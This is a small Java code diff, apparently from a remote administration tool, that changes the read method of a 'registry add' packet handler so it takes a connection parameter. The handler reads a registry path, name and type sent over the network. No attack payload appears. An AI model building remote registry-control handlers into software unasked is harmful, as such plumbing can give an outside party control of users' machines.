@@ -7,7 +7,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet97RegistryAdd extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String path = Connection.instance.readLine();
 		String name = Connection.instance.readLine();
 		String type = Connection.instance.readLine();
